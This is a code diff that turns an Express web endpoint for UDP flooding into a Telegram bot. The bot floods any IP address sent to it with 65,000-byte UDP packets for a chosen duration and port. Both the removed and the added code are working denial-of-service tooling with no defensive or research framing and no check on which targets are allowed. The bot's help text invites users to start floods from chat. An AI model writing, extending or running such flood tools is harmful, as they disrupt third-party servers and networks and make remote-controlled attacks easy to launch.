@@ -1,32 +1,54 @@
-const express = require('express');
+const TelegramBot = require('node-telegram-bot-api');
 const dgram = require('dgram');
-const app = express();
-const port = 3000;
 
-app.get('/flood', (req, res) => {
-    const host = req.query.host;
-    const exec_time = parseInt(req.query.time);
-    let packets = 0;
-    const max_time = Date.now() + exec_time * 1000;
-    const out = 'X'.repeat(65000);
+// Replace 'YOUR_TELEGRAM_BOT_TOKEN' with the token you get from BotFather
+const token = 'YOUR_TELEGRAM_BOT_TOKEN';
+const bot = new TelegramBot(token, { polling: true });
 
-    const sendPacket = () => {
-        if (Date.now() > max_time) {
-            clearInterval(interval);
-            res.send(`<br><b>UDP Flood</b><br>Completed with ${packets} (${((packets * 65) / 1024).toFixed(2)} MB) packets averaging ${(packets / exec_time).toFixed(2)} packets per second \n`);
-            return;
-        }
-        const randPort = Math.floor(Math.random() * 65000) + 1;
-        const client = dgram.createSocket('udp4');
-        client.send(out, randPort, host, (err) => {
-            if (!err) packets++;
-            client.close();
-        });
-    };
+// Function to perform UDP flood
+const udpFlood = (chatId, host, duration, port) => {
+  const client = dgram.createSocket('udp4');
+  const message = Buffer.alloc(65000, 'X');
 
-    const interval = setInterval(sendPacket, 0);
+  const endTime = Date.now() + duration * 1000;
+  let packets = 0;
+
+  const sendPacket = () => {
+    if (Date.now() > endTime) {
+      client.close();
+      bot.sendMessage(chatId, `UDP Flood completed with ${packets} packets.`);
+      return;
+    }
+    packets++;
+    const targetPort = port || Math.floor(Math.random() * 65535) + 1;
+    client.send(message, 0, message.length, targetPort, host, (err) => {
+      if (err) {
+        console.error(`Error: ${err.message}`);
+      }
+      sendPacket();
+    });
+  };
+
+  sendPacket();
+};
+
+// Handler for the /start command
+bot.onText(/\/start/, (msg) => {
+  bot.sendMessage(msg.chat.id, 'Welcome to the UDP Flood Bot. Send /udp <IP> <duration> <port (optional)> to start the flood.');
 });
 
-app.listen(port, () => {
-    console.log(`Server running at http://localhost:${port}`);
+// Handler for the /udp command with parameters
+bot.onText(/\/udp (.+) (.+) ?(\d+)?/, (msg, match) => {
+  const chatId = msg.chat.id;
+  const host = match[1];
+  const duration = parseInt(match[2], 10);
+  const port = match[3] ? parseInt(match[3], 10) : null;
+
+  if (!host || isNaN(duration) || duration <= 0) {
+    bot.sendMessage(chatId, 'Invalid parameters. Usage: /udp <IP> <duration> <port (optional)>');
+    return;
+  }
+
+  bot.sendMessage(chatId, `Starting UDP flood on ${host} for ${duration} seconds on port ${port || 'random'}.`);
+  udpFlood(chatId, host, duration, port);
 });
